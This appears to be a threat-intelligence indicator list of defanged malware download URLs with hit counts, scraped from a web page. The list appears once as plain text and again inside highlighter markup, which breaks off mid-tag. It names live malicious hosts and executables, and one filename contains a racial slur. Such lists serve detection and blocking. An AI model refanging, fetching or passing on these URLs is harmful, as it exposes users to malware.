2	hxxps://www[.]dropbox.com/s/gx6kxkfi7ky2j6f/Dropbox.exe?dl=1
1	hxxp://185[.]106.122.62/file.exe
1	hxxp://185[.]45.193.169/update.exe
1	hxxp://31[.]184.234.74/crypted/1080qw.exe
1	hxxp://aircraftpns[.]com/_layout/images/sysmonitor.exe
1	hxxp://allbestunlockerpro[.]com/flash.player.exe
1	hxxp://anonfile[.]xyz/f/3d0a4fb54941eb10214f3c1a5fb3ed99.exe
1	hxxp://anonfile[.]xyz/f/921e1b3c55168c2632318b6d22a7bfe6.exe
1	hxxp://brokelimiteds[.]in/wp-admin/css/upload/ken1.exe
1	hxxp://cajos[.]in/0x/1.exe
1	hxxp://danhviet[.]com.vn/app/p2.exe
1	hxxp://danhviet[.]com.vn/z/v/doc.exe
1	hxxp://daratad[.]5gbfree.com/uses/word.exe
1	hxxp://ddl2[.]data.hu/get/0/9589621/k000.exe
1	hxxp://ddl3[.]data.hu/get/0/9535517/yhaooo.exe
1	hxxp://ddl3[.]data.hu/get/0/9551162/ske.exe
1	hxxp://ddl7[.]data.hu/get/0/9552103/PFIfdp.exe
1	hxxp://getlohnumceders[.]honor.es/kimt.exe
1	hxxp://hinrichsen[.]de/assets/win1/win1.exe
1	hxxp://icbg-iq[.]com/Scripts/kinetics/categories/3rmax.exe
1	hxxp://khoun-legal[.]com/download/ctob.exe
1	hxxp://kiana[.]com/flowplayer/aquafresh.exe
1	hxxp://labid[.]com.my/power/powex.exe
1	hxxp://matkalv[.]5gbfree.com/calab/calafile.exe
1	hxxp://matkalv[.]5gbfree.com/noza/odeee.exe
1	hxxp://matkalv[.]5gbfree.com/owee/owe.exe
1	hxxp://matkalv[.]5gbfree.com/vosa/doc.exe
1	hxxp://nikil[.]tk/b1/bo_001.exe
1	hxxp://nikil[.]tk/k1/ik_001.exe
1	hxxp://sukem[.]zapto.org/word.exe
1	hxxp://trolda[.]5gbfree.com/fosee/doc.exe
1	hxxp://worldnit[.]com/aba.exe
1	hxxp://worldnit[.]com/aba.exe
1	hxxp://worldnit[.]com/abacoss.exe
1	hxxp://worldnit[.]com/abuchi.exe
1	hxxp://worldnit[.]com/com.exe
1	hxxp://worldnit[.]com/com.exe
1	hxxp://worldnit[.]com/compu.exe
1	hxxp://worldnit[.]com/comu.exe
1	hxxp://worldnit[.]com/firefox32.exe
1	hxxp://worldnit[.]com/igbo.exe
1	hxxp://worldnit[.]com/immo.exe
1	hxxp://worldnit[.]com/kele.exe
1	hxxp://worldnit[.]com/kelle.exe
1	hxxp://worldnit[.]com/kells.exe
1	hxxp://worldnit[.]com/kuku.exe
1	hxxp://worldnit[.]com/nigga.exe
1	hxxp://worldnit[.]com/nigga.exe
1	hxxp://worldnit[.]com/office.exe
1	hxxp://worldnit[.]com/pony.exe
1	hxxp://worldnit[.]com/seccrypt.exe
1	hxxp://worldnit[.]com/sect.exe
1	hxxp://www[.]athensheartcenter.com/crm/cgi-bin/lnm.exe
1	hxxp://www[.]bryonz.com/emotions/files/lnwe.exe
1	hxxp://www[.]fluidsystems.ml/P1/Pa_001.exe
1	hxxp://www[.]macwizinfo.com/updates/eter.exe
1	hxxp://www[.]matrimonioadvisor.it/pariglia.exe
1	hxxp://www[.]pelicanlinetravels.com/images/xvcbkty.exe
1	hxxp://www[.]telemedia.co.za/wp-content/ozone/slim.exe
1	hxxp://www[.]wealthandhealthops.com/modules/mod_easybloglist/kntgszu.exe
1	hxxp://www[.]wvhmedicine.ru/1/P2.exe
1	hxxps://1fichier[.]com/?hfshjhm0yf
1	hxxps://1fichier[.]com/?v8w3g736hj
1	hxxps://a[.]pomf.cat/jfyywz.exe
1	hxxps://a[.]pomf.cat/klckcp.exe
1	hxxps://a[.]pomf.cat/wopkwj.exe
1	hxxps://a[.]pomf.cat/yhggkj.exe
1	hxxps://dryversdocumentgritsettings[.]com/javaupdat3s2016.exe
1	hxxps://megadl[.]fr/?b5r5bstqd1
1	hxxps://srv-file1[.]gofile.io/download/SJLKaG/84.200.65.20/wscript.exe</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60a9b96a2c9b1144488533-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9b1144488533-2">2</div><div class="crayon-num" data-line="crayon-60a9b96a2c9b1144488533-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9b1144488533-4">4</div><div class="crayon-num" data-line="crayon-60a9b96a2c9b1144488533-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9b1144488533-6">6</div><div class="crayon-num" data-line="crayon-60a9b96a2c9b1144488533-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9b1144488533-8">8</div><div class="crayon-num" data-line="crayon-60a9b96a2c9b1144488533-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9b1144488533-10">10</div><div class="crayon-num" data-line="crayon-60a9b96a2c9b1144488533-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9b1144488533-12">12</div><div class="crayon-num" data-line="crayon-60a9b96a2c9b1144488533-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9b1144488533-14">14</div><div class="crayon-num" data-line="crayon-60a9b96a2c9b1144488533-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9b1144488533-16">16</div><div class="crayon-num" data-line="crayon-60a9b96a2c9b1144488533-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9b1144488533-18">18</div><div class="crayon-num" data-line="crayon-60a9b96a2c9b1144488533-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9b1144488533-20">20</div><div class="crayon-num" data-line="crayon-60a9b96a2c9b1144488533-21">21</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9b1144488533-22">22</div><div class="crayon-num" data-line="crayon-60a9b96a2c9b1144488533-23">23</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9b1144488533-24">24</div><div class="crayon-num" data-line="crayon-60a9b96a2c9b1144488533-25">25</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9b1144488533-26">26</div><div class="crayon-num" data-line="crayon-60a9b96a2c9b1144488533-27">27</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9b1144488533-28">28</div><div class="crayon-num" data-line="crayon-60a9b96a2c9b1144488533-29">29</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9b1144488533-30">30</div><div class="crayon-num" data-line="crayon-60a9b96a2c9b1144488533-31">31</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9b1144488533-32">32</div><div class="crayon-num" data-line="crayon-60a9b96a2c9b1144488533-33">33</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9b1144488533-34">34</div><div class="crayon-num" data-line="crayon-60a9b96a2c9b1144488533-35">35</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9b1144488533-36">36</div><div class="crayon-num" data-line="crayon-60a9b96a2c9b1144488533-37">37</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9b1144488533-38">38</div><div class="crayon-num" data-line="crayon-60a9b96a2c9b1144488533-39">39</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9b1144488533-40">40</div><div class="crayon-num" data-line="crayon-60a9b96a2c9b1144488533-41">41</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9b1144488533-42">42</div><div class="crayon-num" data-line="crayon-60a9b96a2c9b1144488533-43">43</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9b1144488533-44">44</div><div class="crayon-num" data-line="crayon-60a9b96a2c9b1144488533-45">45</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9b1144488533-46">46</div><div class="crayon-num" data-line="crayon-60a9b96a2c9b1144488533-47">47</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9b1144488533-48">48</div><div class="crayon-num" data-line="crayon-60a9b96a2c9b1144488533-49">49</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9b1144488533-50">50</div><div class="crayon-num" data-line="crayon-60a9b96a2c9b1144488533-51">51</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9b1144488533-52">52</div><div class="crayon-num" data-line="crayon-60a9b96a2c9b1144488533-53">53</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9b1144488533-54">54</div><div class="crayon-num" data-line="crayon-60a9b96a2c9b1144488533-55">55</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9b1144488533-56">56</div><div class="crayon-num" data-line="crayon-60a9b96a2c9b1144488533-57">57</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9b1144488533-58">58</div><div class="crayon-num" data-line="crayon-60a9b96a2c9b1144488533-59">59</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9b1144488533-60">60</div><div class="crayon-num" data-line="crayon-60a9b96a2c9b1144488533-61">61</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9b1144488533-62">62</div><div class="crayon-num" data-line="crayon-60a9b96a2c9b1144488533-63">63</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9b1144488533-64">64</div><div class="crayon-num" data-line="crayon-60a9b96a2c9b1144488533-65">65</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9b1144488533-66">66</div><div class="crayon-num" data-line="crayon-60a9b96a2c9b1144488533-67">67</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9b1144488533-68">68</div><div class="crayon-num" data-line="crayon-60a9b96a2c9b1144488533-69">69</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9b1144488533-70">70</div><div class="crayon-num" data-line="crayon-60a9b96a2c9b1144488533-71">71</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9b1144488533-72">72</div><div class="crayon-num" data-line="crayon-60a9b96a2c9b1144488533-73">73</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9b1144488533-74">74</div><div class="crayon-num" data-line="crayon-60a9b96a2c9b1144488533-75">75</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9b1144488533-76">76</div><div class="crayon-num" data-line="crayon-60a9b96a2c9b1144488533-77">77</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9b1144488533-78">78</div><div class="crayon-num" data-line="crayon-60a9b96a2c9b1144488533-79">79</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9b1144488533-80">80</div><div class="crayon-num" data-line="crayon-60a9b96a2c9b1144488533-81">81</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9b1144488533-82">82</div><div class="crayon-num" data-line="crayon-60a9b96a2c9b1144488533-83">83</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9b1144488533-84">84</div><div class="crayon-num" data-line="crayon-60a9b96a2c9b1144488533-85">85</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9b1144488533-86">86</div><div class="crayon-num" data-line="crayon-60a9b96a2c9b1144488533-87">87</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9b1144488533-88">88</div><div class="crayon-num" data-line="crayon-60a9b96a2c9b1144488533-89">89</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9b1144488533-90">90</div><div class="crayon-num" data-line="crayon-60a9b96a2c9b1144488533-91">91</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9b1144488533-92">92</div><div class="crayon-num" data-line="crayon-60a9b96a2c9b1144488533-93">93</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9b1144488533-94">94</div><div class="crayon-num" data-line="crayon-60a9b96a2c9b1144488533-95">95</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9b1144488533-96">96</div><div class="crayon-num" data-line="crayon-60a9b96a2c9b1144488533-97">97</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9b1144488533-98">98</div><div class="crayon-num" data-line="crayon-60a9b96a2c9b1144488533-99">99</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9b1144488533-100">100</div><div class="crayon-num" data-line="crayon-60a9b96a2c9b1144488533-101">101</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9b1144488533-102">102</div><div class="crayon-num" data-line="crayon-60a9b96a2c9b1144488533-103">103</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9b1144488533-104">104</div><div class="crayon-num" data-line="crayon-60a9b96a2c9b1144488533-105">105</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9b1144488533-106">106</div><div class="crayon-num" data-line="crayon-60a9b96a2c9b1144488533-107">107</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9b1144488533-108">108</div><div class="crayon-num" data-line="crayon-60a9b96a2c9b1144488533-109">109</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9b1144488533-110">110</div><div class="crayon-num" data-line="crayon-60a9b96a2c9b1144488533-111">111</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9b1144488533-112">112</div><div class="crayon-num" data-line="crayon-60a9b96a2c9b1144488533-113">113</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9b1144488533-114">114</div><div class="crayon-num" data-line="crayon-60a9b96a2c9b1144488533-115">115</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9b1144488533-116">116</div><div class="crayon-num" data-line="crayon-60a9b96a2c9b1144488533-117">117</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9b1144488533-118">118</div><div class="crayon-num" data-line="crayon-60a9b96a2c9b1144488533-119">119</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9b1144488533-120">120</div><div class="crayon-num" data-line="crayon-60a9b96a2c9b1144488533-121">121</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9b1144488533-122">122</div><div class="crayon-num" data-line="crayon-60a9b96a2c9b1144488533-123">123</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9b1144488533-124">124</div><div class="crayon-num" data-line="crayon-60a9b96a2c9b1144488533-125">125</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9b1144488533-126">126</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60a9b96a2c9b1144488533-1"><span class="crayon-cn">675</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//94[.]102.53.238/~yahoo/csrsv.exe</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9b1144488533-2"><span class="crayon-cn">244</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//89[.]248.170.218/~yahoo/csrsv.exe</span></div><div class="crayon-line" id="crayon-60a9b96a2c9b1144488533-3"><span class="crayon-cn">132</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//94[.]102.58.30/~trevor/winx64.exe</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9b1144488533-4"><span class="crayon-cn">70</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//80[.]82.64.45/~yakar/msvmonr.exe</span></div><div class="crayon-line" id="crayon-60a9b96a2c9b1144488533-5"><span class="crayon-cn">24</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//89[.]248.166.140/~zebra/iesecv.exe</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9b1144488533-6"><span class="crayon-cn">18</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//cajos[.]in/0x/1.exe</span></div><div class="crayon-line" id="crayon-60a9b96a2c9b1144488533-7"><span class="crayon-cn">14</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//93[.]174.94.137/~karma/scvhost.exe</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9b1144488533-8"><span class="crayon-cn">6</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//ddl7[.]data.hu/get/0/9507148/Patload.exe</span></div><div class="crayon-line" id="crayon-60a9b96a2c9b1144488533-9"><span class="crayon-cn">5</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//nikil[.]tk/p1/Pa_001.exe</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9b1144488533-10"><span class="crayon-cn">5</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//185[.]45.193.17/update.exe</span></div><div class="crayon-line" id="crayon-60a9b96a2c9b1144488533-11"><span class="crayon-cn">5</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//185[.]141.27.28/update.exe</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9b1144488533-12"><span class="crayon-cn">4</span><span class="crayon-h">	</span><span class="crayon-v">hxxps</span><span class="crayon-o">:</span><span class="crayon-c">//a[.]pomf.cat/xsakpo.exe</span></div><div class="crayon-line" id="crayon-60a9b96a2c9b1144488533-13"><span class="crayon-cn">4</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//185[.]141.27.35/update.exe</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9b1144488533-14"><span class="crayon-cn">3</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//www[.]macwizinfo.com/updates/anna.exe</span></div><div class="crayon-line" id="crayon-60a9b96a2c9b1144488533-15"><span class="crayon-cn">3</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//worldnit[.]com/opera.exe</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9b1144488533-16"><span class="crayon-cn">3</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//doc[.]cherrycoffeeequipment.com/nw/logo.png</span></div><div class="crayon-line" id="crayon-60a9b96a2c9b1144488533-17"><span class="crayon-cn">3</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//185[.]141.25.142/update.exe</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9b1144488533-18"><span class="crayon-cn">3</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//185[.]117.75.43/update.exe</span></div><div class="crayon-line" id="crayon-60a9b96a2c9b1144488533-19"><span class="crayon-cn">3</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//185[.]106.122.64/update.exe</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9b1144488533-20"><span class="crayon-cn">2</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//185[.]141.25.243/file.exe</span></div><div class="crayon-line" id="crayon-60a9b96a2c9b1144488533-21"><span class="crayon-cn">2</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//185[.]141.27.32/update.exe</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9b1144488533-22"><span class="crayon-cn">2</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//185[.]141.27.34/update.exe</span></div><div class="crayon-line" id="crayon-60a9b96a2c9b1144488533-23"><span class="crayon-cn">2</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//andersonken4791[.]pserver.ru/doc.exe</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9b1144488533-24"><span class="crayon-cn">2</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//boisedelariviere[.]com/backup/css/newconfig.exe</span></div><div class="crayon-line" id="crayon-60a9b96a2c9b1144488533-25"><span class="crayon-cn">2</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//brokelimiteds[.]in/wp-admin/css/upload/Order.exe</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9b1144488533-26"><span class="crayon-cn">2</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//ddl7[.]data.hu/get/0/9499830/money.exe</span></div><div class="crayon-line" id="crayon-60a9b96a2c9b1144488533-27"><span class="crayon-cn">2</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//fetzhost[.]net/files/044ae4aa5e0f2e8df02bd41bdc2670b0.exe</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9b1144488533-28"><span class="crayon-cn">2</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//hnng[.]moe/f/InX</span></div><div class="crayon-line" id="crayon-60a9b96a2c9b1144488533-29"><span class="crayon-cn">2</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//hnng[.]moe/f/Iot</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9b1144488533-30"><span class="crayon-cn">2</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//labid[.]com.my/m/m1.exe</span></div><div class="crayon-line" id="crayon-60a9b96a2c9b1144488533-31"><span class="crayon-cn">2</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//labid[.]com.my/power/powex.exe</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9b1144488533-32"><span class="crayon-cn">2</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//labid[.]com.my/spe/spendy.exe</span></div><div class="crayon-line" id="crayon-60a9b96a2c9b1144488533-33"><span class="crayon-cn">2</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//lvrxd[.]3eeweb.com/nano/Calculator.exe</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9b1144488533-34"><span class="crayon-cn">2</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//matkalv[.]5gbfree.com/loso/fasoo.exe</span></div><div class="crayon-line" id="crayon-60a9b96a2c9b1144488533-35"><span class="crayon-cn">2</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//net[.]gethost.pw/windro.exe</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9b1144488533-36"><span class="crayon-cn">2</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//nikil[.]tk/i1/iz_001.exe</span></div><div class="crayon-line" id="crayon-60a9b96a2c9b1144488533-37"><span class="crayon-cn">2</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//rgho[.]st/68lJcGFLW</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9b1144488533-38"><span class="crayon-cn">2</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//rgho[.]st/6hrkjYlX4</span></div><div class="crayon-line" id="crayon-60a9b96a2c9b1144488533-39"><span class="crayon-cn">2</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//toxicsolutions[.]ru/upload/praisefud.exe</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9b1144488533-40"><span class="crayon-cn">2</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//worldnit[.]com/KUKU.exe</span></div><div class="crayon-line" id="crayon-60a9b96a2c9b1144488533-41"><span class="crayon-cn">2</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//worldnit[.]com/kundelo.exe</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9b1144488533-42"><span class="crayon-cn">2</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//worldnit[.]com/operamini.exe</span></div><div class="crayon-line" id="crayon-60a9b96a2c9b1144488533-43"><span class="crayon-cn">2</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//www[.]wealthandhealthops.com/modules/mod_easyblogquickpost/lawdsijdoef.exe</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9b1144488533-44"><span class="crayon-cn">2</span><span class="crayon-h">	</span><span class="crayon-v">hxxps</span><span class="crayon-o">:</span><span class="crayon-c">//a[.]pomf.cat/drktzz.exe</span></div><div class="crayon-line" id="crayon-60a9b96a2c9b1144488533-45"><span class="crayon-cn">2</span><span class="crayon-h">	</span><span class="crayon-v">hxxps</span><span class="crayon-o">:</span><span class="crayon-c">//a[.]pomf.cat/dwnysn.exe</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9b1144488533-46"><span class="crayon-cn">2</span><span class="crayon-h">	</span><span class="crayon-v">hxxps</span><span class="crayon-o">:</span><span class="crayon-c">//a[.]pomf.cat/dwnysn.exe</span></div><div class="crayon-line" id="crayon-60a9b96a2c9b1144488533-47"><span class="crayon-cn">2</span><span class="crayon-h">	</span><span class="crayon-v">hxxps</span><span class="crayon-o">:</span><span class="crayon-c">//a[.]pomf.cat/hsmqrh.exe</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9b1144488533-48"><span class="crayon-cn">2</span><span class="crayon-h">	</span><span class="crayon-v">hxxps</span><span class="crayon-o">:</span><span class="crayon-c">//a[.]pomf.cat/mjnspx.exe</span></div><div class="crayon-line" id="crayon-60a9b96a2c9b1144488533-49"><span class="crayon-cn">2</span><span class="crayon-h">	</span><span class="crayon-v">hxxps</span><span class="crayon-o">:</span><span class="crayon-c">//a[.]pomf.cat/pabfzv.exe</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9b1144488533-50"><span class="crayon-cn">2</span><span class="crayon-h">	</span><span class="crayon-v">hxxps</span><span class="crayon-o">:</span><span class="crayon-c">//a[.]pomf.cat/qolcls.exe</span></div><div class="crayon-line" id="crayon-60a9b96a2c9b1144488533-51"><span class="crayon-cn">2</span><span class="crayon-h">	</span><span class="crayon-v">hxxps</span><span class="crayon-o">:</span><span class="crayon-c">//a[.]pomf.cat/tpaesb.exe</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9b1144488533-52"><span class="crayon-cn">2</span><span class="crayon-h">	</span><span class="crayon-v">hxxps</span><span class="crayon-o">:</span><span class="crayon-c">//a[.]pomf.cat/ultxkr.exe</span></div><div class="crayon-line" id="crayon-60a9b96a2c9b1144488533-53"><span class="crayon-cn">2</span><span class="crayon-h">	</span><span class="crayon-v">hxxps</span><span class="crayon-o">:</span><span class="crayon-c">//a[.]pomf.cat/vhcwbo.exe</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9b1144488533-54"><span class="crayon-cn">2</span><span class="crayon-h">	</span><span class="crayon-v">hxxps</span><span class="crayon-o">:</span><span class="crayon-c">//a[.]pomf.cat/vjadwb.exe</span></div><div class="crayon-line" id="crayon-60a9b96a2c9b1144488533-55"><span class="crayon-cn">2</span><span class="crayon-h">	</span><span class="crayon-v">hxxps</span><span class="crayon-o">:</span><span class="crayon-c">//a[.]pomf.cat/wopkwj.exe</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9b1144488533-56"><span class="crayon-cn">2</span><span class="crayon-h">	</span><span class="crayon-v">hxxps</span><span class="crayon-o">:</span><span class="crayon-c">//a[.]pomf.cat/yspcsr.exe</span></div><div class="crayon-line" id="crayon-60a9b96a2c9b1144488533-57"><span class="crayon-cn">2</span><span class="crayon-h">	</span><span class="crayon-v">hxxps</span><span class="crayon-o">:</span><span class="crayon-c">//www[.]dropbox.com/s/gx6kxkfi7ky2j6f/Dropbox.exe?dl=1</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9b1144488533-58"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//185[.]106.122.62/file.exe</span></div><div class="crayon-line" id="crayon-60a9b96a2c9b1144488533-59"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span 